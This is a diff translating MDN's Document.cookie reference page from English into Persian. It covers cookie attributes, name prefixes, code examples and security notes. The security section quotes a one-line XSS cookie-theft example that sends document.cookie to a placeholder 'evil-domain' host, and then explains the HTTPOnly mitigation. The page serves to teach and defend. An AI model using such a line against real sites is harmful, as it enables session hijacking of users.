@@ -1,7 +1,5 @@
 ---
 title: "Document: cookie property"
-source: "https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie"
-status: "needs-translation"
 ---
 
 ---
@@ -14,72 +12,72 @@ browser-compat: api.Document.cookie
 
 {{APIRef("DOM")}}
 
-The {{domxref("Document")}} property `cookie` lets you read and write [cookies](/en-US/docs/Web/HTTP/Guides/Cookies) associated with the document.
-It serves as a getter and setter for the actual values of the cookies.
+ویژگی `cookie` در {{domxref("Document")}} به شما امکان می‌دهد [کوکی‌ها](/en-US/docs/Web/HTTP/Guides/Cookies) مرتبط با سند را بخوانید و بنویسید. این ویژگی به‌عنوان getter و setter برای مقادیر واقعی کوکی‌ها عمل می‌کند.
 
 > [!NOTE]
-> The `document.cookie` can be a source of performance issues because it is a synchronous API and blocks the main thread when reading cookies across processes or performing I/O operations. Developers should if possible use the asynchronous [Cookie Store API](/en-US/docs/Web/API/Cookie_Store_API) to manage cookies.
+> `document.cookie` می‌تواند منبع مشکلات کارایی باشد، زیرا یک API همزمان است و هنگام خواندن کوکی‌ها بین فرآیندها یا انجام عملیات I/O، رشته اصلی (main thread) را مسدود می‌کند. توسعه‌دهندگان باید در صورت امکان از [Cookie Store API](/en-US/docs/Web/API/Cookie_Store_API) ناهمگام برای مدیریت کوکی‌ها استفاده کنند.
 
-## Value
+## مقدار
 
-A string containing a semicolon-separated list of all cookies (i.e., `key=value` pairs).
-Note that each _key_ and _value_ may be surrounded by whitespace (space and tab characters): in fact, {{RFC(6265)}} mandates a single space after each semicolon, but some user agents may not abide by this.
+رشته‌ای شامل فهرستی از همه کوکی‌ها که با نقطه‌ویرگول جدا شده‌اند (یعنی جفت‌های `key=value`).
+توجه داشته باشید که هر _کلید_ و _مقدار_ ممکن است با فضای خالی (شامل فاصله و تب) احاطه شود: در واقع، {{RFC(6265)}} یک فاصله پس از هر نقطه‌ویرگول را الزام می‌کند، اما برخی عامل‌های کاربر ممکن است از این قاعده پیروی نکنند.
 
-You can also assign to this property a string of the form `"key=value"`, specifying the cookie to set/update. Note that you can only set/update a single cookie at a time using this method. Consider also that:
+همچنین می‌توانید به این ویژگی رشته‌ای به شکل `"key=value"` نسبت دهید و کوکی موردنظر برای تنظیم/به‌روزرسانی را مشخص کنید. توجه داشته باشید که با این روش فقط می‌توانید در هر بار یک کوکی را تنظیم/به‌روزرسانی کنید. همچنین در نظر بگیرید که:
 
-- Any of the following cookie attribute values can optionally follow the key-value pair, each preceded by a semicolon separator:
-  - `;domain=domain` (e.g., `example.com` or `subdomain.example.com`): The host to which the cookie will be sent.
-    If not specified, this defaults to the host portion of the current document location and the cookie is not available on subdomains.
-    If a domain is specified, subdomains are always included.
-    Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots.
-
-    > [!NOTE]
-    > The domain _must_ match the domain of the JavaScript origin.
-    > Setting cookies to foreign domains will be silently ignored.
-
-  - `;expires=date-in-UTCString-format`: The expiry date of the cookie. If neither `expires` nor `max-age` is specified, it will expire at the end of session.
-
-    > [!WARNING]
-    > When user privacy is a concern, it's important that any web app implementation invalidate cookie data after a certain timeout instead of relying on the browser to do it.
-    > Many browsers let users specify that cookies should never expire, which is not necessarily safe.
-
-    See {{jsxref("Date.toUTCString()")}} for help formatting this value.
-
-  - `;max-age=max-age-in-seconds`: The maximum age of the cookie in seconds (e.g., `60*60*24*365` or 31536000 for a year).
-
-  - `;partitioned`: Indicates that the cookie should be stored using partitioned storage. See [Cookies Having Independent Partitioned State (CHIPS)](/en-US/docs/Web/Privacy/Guides/Third-party_cookies/Partitioned_cookies) for more details.
-
-  - `;path=path`: The value of the cookie's `Path` attribute (See [Define where cookies are sent](/en-US/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) for more information).
-
-  - `;samesite`: The `SameSite` attribute of a {{httpheader("Set-Cookie")}} header can be set by a server to specify when the cookie will be sent. Possible values are `lax`, `strict` or `none` (see also [Controlling third-party cookies with `SameSite`](/en-US/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
-    - The `lax` value will send the cookie for all same-site requests and top-level navigation GET requests.
-      This is sufficient for user tracking, but it will prevent many [Cross-Site Request Forgery](/en-US/docs/Glossary/CSRF) (CSRF) attacks.
-      This is the default value in modern browsers.
-    - The `strict` value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts, even when following a regular link.
-    - The `none` value explicitly states no restrictions will be applied.
-      The cookie will be sent in all requests—both cross-site and same-site.
-
-  - `;secure`: Specifies that the cookie should only be transmitted over a secure protocol.
-
-- The cookie value string can use {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).
-- The cookie name can have a prefix that imposes specific restrictions on the cookie's attributes in supporting user-agents. All cookie prefixes start with a double-underscore (`__`) and end in a dash (`-`). The following prefixes are defined:
-  - **`__Secure-`**: Cookies with names starting with `__Secure-` must be set with the `Secure` attribute by a secure page (HTTPS).
-  - **`__Host-`**: Cookies with names starting with `__Host-` must be set with the `Secure` attribute by a secure page (HTTPS). In addition, they must not have a `Domain` attribute specified, and the `Path` attribute must be set to `/`. This guarantees that such cookies are only sent to the host that set them, and not to any other host on the domain. It also guarantees that they are set host-wide and cannot be overridden on any path on that host. This combination yields a cookie that is as close as can be to treating the origin as a security boundary.
-  - **`__Http-`**: Cookies with names starting with `__Http-` must be set with the `Secure` flag by a secure page (HTTPS) and in addition must have the `HttpOnly` attribute set to prove that they were set via the `Set-Cookie` header (they can't be set or modified via JavaScript features such as `Document.cookie` or the [Cookie Store API](/en-US/docs/Web/API/Cookie_Store_API)).
-  - **`__Host-Http-`**: Cookies with names starting with `__Host-Http-` must be set with the `Secure` flag by a secure page (HTTPS) and must have the `HttpOnly` attribute set to prove that they were set via the `Set-Cookie` header. In addition, they also have the same restrictions as `__Host-`-prefixed cookies. This combination yields a cookie that is as close as can be to treating the origin as a security boundary while at the same time ensuring developers and server operators know that its scope is limited to HTTP requests.
+- `;domain=domain` (مثلاً `example.com` یا `subdomain.example.com`): میزبانی که کوکی به آن ارسال خواهد شد.
+  اگر مشخص نشود، به‌طور پیش‌فرض به بخش host از مکان سند فعلی تنظیم می‌شود و کوکی در زیردامنه‌ها در دسترس نخواهد بود.
+  اگر یک دامنه مشخص شود، زیردامنه‌ها همیشه شامل می‌شوند.
+  برخلاف مشخصات قبلی، نقطه‌های ابتدایی در نام دامنه نادیده گرفته می‌شوند، اما ممکن است مرورگرها از تنظیم کوکی حاوی چنین نقطه‌هایی خودداری کنند.
 
   > [!NOTE]
-  > The dash is considered part of the prefix.
+  > دامنه _باید_ با دامنه مبدأ جاوااسکریپت مطابقت داشته باشد.
+  > تنظیم کوکی‌ها برای دامنه‌های خارجی بی‌صدا نادیده گرفته می‌شود.
 
-  > [!NOTE]
-  > These flags are only settable with the `secure` attribute.
+- `;expires=date-in-UTCString-format`: تاریخ انقضای کوکی. اگر نه `expires` و نه `max-age` مشخص شده باشد، کوکی در پایان نشست منقضی می‌شود.
+
+  > [!WARNING]
+  > وقتی حریم خصوصی کاربر مطرح است، مهم است که هر پیاده‌سازی برنامه وب پس از یک مهلت زمانی مشخص، داده‌های کوکی را بی‌اعتبار کند، به‌جای اینکه به مرورگر برای انجام این کار تکیه کند.
+  > بسیاری از مرورگرها به کاربران اجازه می‌دهند تعیین کنند کوکی‌ها هرگز منقضی نشوند، که لزوماً امن نیست.
+
+  برای کمک در قالب‌بندی این مقدار، {{jsxref("Date.toUTCString()")}} را ببینید.
+
+- `;max-age=max-age-in-seconds`: حداکثر عمر کوکی بر حسب ثانیه (مثلاً `60*60*24*365` یا 31536000 برای یک سال).
+
+- `;partitioned`: نشان می‌دهد که کوکی باید با استفاده از ذخیره‌سازی پارتیشن‌بندی‌شده ذخیره شود. برای جزئیات بیشتر به [Cookies Having Independent Partitioned State (CHIPS)](/en-US/docs/Web/Privacy/Guides/Third-party_cookies/Partitioned_cookies) مراجعه کنید.
+
+- `;path=path`: مقدار ویژگی `Path` کوکی (برای اطلاعات بیشتر به [Define where cookies are sent](/en-US/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) مراجعه کنید).
+
+- `;samesite`: ویژگی `SameSite` در هدر {{httpheader("Set-Cookie")}} می‌تواند توسط سرور تنظیم شود تا مشخص کند کوکی چه زمانی ارسال خواهد شد. مقادیر ممکن عبارت‌اند از `lax`، `strict` یا `none` (همچنین ببینید [Controlling third-party cookies with `SameSite`](/en-US/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).
+  - مقدار `lax` کوکی را برای همه درخواست‌های همان‌سایت و درخواست‌های GET ناوبری سطح بالا ارسال می‌کند.
+    این مقدار برای ردیابی کاربر کافی است، اما از بسیاری از حملات [Cross-Site Request Forgery](/en-US/docs/Glossary/CSRF) (CSRF) جلوگیری می‌کند.
+    این مقدار پیش‌فرض در مرورگرهای مدرن است.
+  - مقدار `strict` از ارسال کوکی توسط مرورگر به سایت مقصد در همه زمینه‌های مرور بین‌سایتی جلوگیری می‌کند، حتی هنگام دنبال کردن یک پیوند معمولی.
+  - مقدار `none` به صراحت بیان می‌کند که هیچ محدودیتی اعمال نخواهد شد.
+    کوکی در همه درخواست‌ها — چه بین‌سایتی و چه همان‌سایتی — ارسال خواهد شد.
+
+- `;secure`: مشخص می‌کند که کوکی فقط از طریق یک پروتکل امن منتقل شود.
+
+رشته مقدار کوکی می‌تواند از {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} استفاده کند تا اطمینان حاصل شود که رشته شامل هیچ کاما، نقطه‌ویرگول یا فضای خالی نباشد (که در مقادیر کوکی مجاز نیستند).
+
+نام کوکی می‌تواند پیشوندی داشته باشد که محدودیت‌های خاصی را بر ویژگی‌های کوکی در عامل‌های کاربر پشتیبان اعمال می‌کند. همه پیشوندهای کوکی با دو زیرخط (`__`) شروع می‌شوند و با خط تیره (`-`) پایان می‌یابند. پیشوندهای زیر تعریف شده‌اند:
+
+- **`__Secure-`**: کوکی‌هایی که نام آن‌ها با `__Secure-` شروع می‌شود باید با ویژگی `Secure` توسط یک صفحه امن (HTTPS) تنظیم شوند.
+- **`__Host-`**: کوکی‌هایی که نام آن‌ها با `__Host-` شروع می‌شود باید با ویژگی `Secure` توسط یک صفحه امن (HTTPS) تنظیم شوند. علاوه بر این، نباید ویژگی `Domain` برای آن‌ها مشخص شده باشد و ویژگی `Path` باید روی `/` تنظیم شود. این تضمین می‌کند که چنین کوکی‌هایی فقط به میزبانی که آن‌ها را تنظیم کرده ارسال می‌شوند، نه به هیچ میزبان دیگری در دامنه. همچنین تضمین می‌کند که آن‌ها در سطح میزبان تنظیم شده‌اند و نمی‌توان آن‌ها را در هیچ مسیری روی آن میزبان بازنویسی کرد. این ترکیب کوکی‌ای به وجود می‌آورد که تا جای ممکن به در نظر گرفتن مبدأ به‌عنوان مرز امنیتی نزدیک است.
+- **`__Http-`**: کوکی‌هایی که نام آن‌ها با `__Http-` شروع می‌شود باید با پرچم `Secure` توسط یک صفحه امن (HTTPS) تنظیم شوند و علاوه بر آن باید ویژگی `HttpOnly` را داشته باشند تا ثابت شود که از طریق هدر `Set-Cookie` تنظیم شده‌اند (نمی‌توان آن‌ها را از طریق ویژگی‌های جاوااسکریپت مانند `Document.cookie` یا [Cookie Store API](/en-US/docs/Web/API/Cookie_Store_API) تنظیم یا تغییر داد).
+- **`__Host-Http-`**: کوکی‌هایی که نام آن‌ها با `__Host-Http-` شروع می‌شود باید با پرچم `Secure` توسط یک صفحه امن (HTTPS) تنظیم شوند و باید ویژگی `HttpOnly` را داشته باشند تا ثابت شود که از طریق هدر `Set-Cookie` تنظیم شده‌اند. علاوه بر این، آن‌ها همان محدودیت‌های کوکی‌های با پیشوند `__Host-` را نیز دارند. این ترکیب کوکی‌ای به وجود می‌آورد که تا جای ممکن به در نظر گرفتن مبدأ به‌عنوان مرز امنیتی نزدیک است و در عین حال اطمینان می‌دهد توسعه‌دهندگان و اپراتورهای سرور می‌دانند که دامنه (scope) آن به درخواست‌های HTTP محدود است.
 
 > [!NOTE]
-> The `document.cookie` property is an [accessor property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) with native _setter_ and _getter_ functions, and consequently is _not_ a [data property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.
+> خط تیره بخشی از پیشوند محسوب می‌شود.
 
-## Examples
+> [!NOTE]
+> این پرچم‌ها فقط با ویژگی `secure` قابل تنظیم هستند.
 
-### Example 1: Simple usage
+> [!NOTE]
+> ویژگی `document.cookie` یک [accessor property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) با توابع بومی _setter_ و _getter_ است و در نتیجه یک [data property](/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) با مقدار نیست: آنچه می‌نویسید همان چیزی نیست که می‌خوانید، همه‌چیز همیشه توسط مفسر جاوااسکریپت واسطه‌گری می‌شود.
+
+## مثال‌ها
+
+### مثال ۱: استفاده ساده
 
 ```html
 <button id="show">Show cookies</button>
@@ -111,7 +109,7 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}
 
-### Example 2: Get a sample cookie named test2
+### مثال ۲: دریافت یک کوکی نمونه به نام test2
 
 ```html
 <button id="show">Show cookie value</button>
@@ -147,10 +145,9 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}
 
-### Example 3: Do something only once
+### مثال ۳: انجام کاری فقط یک بار
 
-In order to use the following code, please replace all occurrences of the word
-`doSomethingOnlyOnce` (the name of the cookie) with a custom name.
+برای استفاده از کد زیر، لطفاً همه موارد کلمه `doSomethingOnlyOnce` (نام کوکی) را با یک نام دلخواه جایگزین کنید.
 
 ```html
 <button id="do-once">Only do something once</button>
@@ -188,7 +185,7 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}
 
-### Example 4: Reset the previous cookie
+### مثال ۴: بازنشانی کوکی قبلی
 
 ```html
 <button id="reset">Reset only once cookie</button>
@@ -221,7 +218,7 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}
 
-### Example 5: Check a cookie existence
+### مثال ۵: بررسی وجود یک کوکی
 
 ```html
 <button id="check">Check a cookie exists</button>
@@ -258,7 +255,7 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}
 
-### Example 6: Check that a cookie has a specific value
+### مثال ۶: بررسی اینکه یک کوکی مقدار مشخصی دارد
 
 ```html
 <button id="check">Check that a cookie has a specific value</button>
@@ -285,64 +282,54 @@ clearBtn.addEventListener("click", () => {
 
 {{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}
 
-## Security
+## امنیت
 
-It is important to note that the `path` attribute does _not_ protect against unauthorized reading of the cookie from a different path.
-It can be easily bypassed using the DOM, for example by creating a hidden {{HTMLElement("iframe")}} element with the path of the cookie, then accessing this iframe's `contentDocument.cookie` property.
-The only way to protect the cookie is by using a different domain or subdomain, due to the [same origin policy](/en-US/docs/Web/Security/Defenses/Same-origin_policy).
+توجه به این نکته مهم است که ویژگی `path` در برابر خواندن غیرمجاز کوکی از یک مسیر دیگر محافظت نمی‌کند. می‌توان به‌راحتی با استفاده از DOM آن را دور زد، مثلاً با ایجاد یک عنصر پنهان {{HTMLElement("iframe")}} با مسیر کوکی و سپس دسترسی به ویژگی `contentDocument.cookie` آن iframe. تنها راه محافظت از کوکی، استفاده از یک دامنه یا زیردامنه متفاوت است، به دلیل [same origin policy](/en-US/docs/Web/Security/Defenses/Same-origin_policy).
 
-Cookies are often used in web applications to identify a user and their authenticated session.
-Stealing a cookie from a web application leads to hijacking the authenticated user's session.
-Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
+کوکی‌ها اغلب در برنامه‌های وب برای شناسایی کاربر و نشست احراز هویت‌شده او استفاده می‌شوند. سرقت یک کوکی از یک برنامه وب منجر به ربودن نشست کاربر احراز هویت‌شده می‌شود. روش‌های رایج سرقت کوکی‌ها شامل استفاده از [مهندسی اجتماعی](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) یا بهره‌برداری از یک آسیب‌پذیری [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) در برنامه است -
 
 ```js
 new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
-The `HTTPOnly` cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.
-Read more about [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
+ویژگی کوکی `HTTPOnly` می‌تواند به کاهش این حمله کمک کند، زیرا دسترسی به مقدار کوکی را از طریق جاوااسکریپت مسدود می‌کند. بیشتر درباره [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/) بخوانید.
 
-## Notes
+## نکات
 
-- Starting with Firefox 2, a better mechanism for client-side storage is available - [WHATWG DOM Storage](/en-US/docs/Web/API/Web_Storage_API).
-- You can delete a cookie by updating its expiration time to zero.
-- Keep in mind that the more cookies you have, the more data will be transferred between the server and the client for each request.
-  This will make each request slower.
-  It is highly recommended for you to use [WHATWG DOM Storage](/en-US/docs/Web/API/Web_Storage_API) if you are going to keep "client-only" data.
-- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Section 5.3, "Implementation Limits") specifies that there should be **no maximum length** of a cookie's key or value size, and encourages implementations to support **arbitrarily large cookies**.
-  Each browser's implementation maximum will necessarily be different, so consult individual browser documentation.
+- از Firefox 2 به بعد، سازوکار بهتری برای ذخیره‌سازی سمت کلاینت در دسترس است - [WHATWG DOM Storage](/en-US/docs/Web/API/Web_Storage_API).
+- می‌توانید یک کوکی را با به‌روزرسانی زمان انقضای آن به صفر حذف کنید.
+- به خاطر داشته باشید که هر چه کوکی‌های بیشتری داشته باشید، داده‌های بیشتری برای هر درخواست بین سرور و کلاینت منتقل می‌شود. این کار هر درخواست را کندتر می‌کند. اگر می‌خواهید داده‌های «فقط سمت کلاینت» (client-only) را نگهداری کنید، به شدت توصیه می‌شود از [WHATWG DOM Storage](/en-US/docs/Web/API/Web_Storage_API) استفاده کنید.
+- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (بخش 5.3، «محدودیت‌های پیاده‌سازی») مشخص می‌کند که **هیچ حداکثر طولی** برای اندازه کلید یا مقدار کوکی نباید وجود داشته باشد و پیاده‌سازی‌ها را تشویق می‌کند از **کوکی‌های دلخواه بزرگ** پشتیبانی کنند. حداکثر پیاده‌سازی هر مرورگر لزوماً متفاوت خواهد بود، بنابراین به مستندات مرورگر مربوطه مراجعه کنید.
 
-The reason for the asymmetry between getting and setting the `document.cookie` accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, [localStorage](/en-US/docs/Web/API/Web_Storage_API)):
+دلیل عدم تقارن بین خواندن و نوشتن ویژگی دسترسی `document.cookie` به ماهیت کلاینت-سرور کوکی‌ها برمی‌گردد که با سایر روش‌های ذخیره‌سازی کلاینت-کلاینت (مثلاً [localStorage](/en-US/docs/Web/API/Web_Storage_API)) متفاوت است:
 
-- The server tells the client to store a cookie:
+```http
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: cookie_name1=cookie_value1
+Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
 
-  ```http
-  HTTP/1.0 200 OK
-  Content-type: text/html
-  Set-Cookie: cookie_name1=cookie_value1
-  Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
+[content of the page here]
+```
 
-  [content of the page here]
-  ```
+- کلاینت کوکی‌های ذخیره‌شده قبلی خود را به سرور برمی‌گرداند:
 
-- The client sends back to the server its cookies previously stored:
+```http
+GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
+Accept: */*
+```
 
-  ```http
-  GET /sample_page.html HTTP/1.1
-  Host: www.example.org
-  Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
-  Accept: */*
-  ```
-
-## Specifications
+## مشخصات
 
 {{Specifications}}
 
-## Browser compatibility
+## سازگاری مرورگر
 
 {{Compat}}
 
-## See also
+## جستارهای وابسته
 
 - [HTTP cookies](/en-US/docs/Web/HTTP/Guides/Cookies)
 - [DOM Storage](/en-US/docs/Web/API/Web_Storage_API)
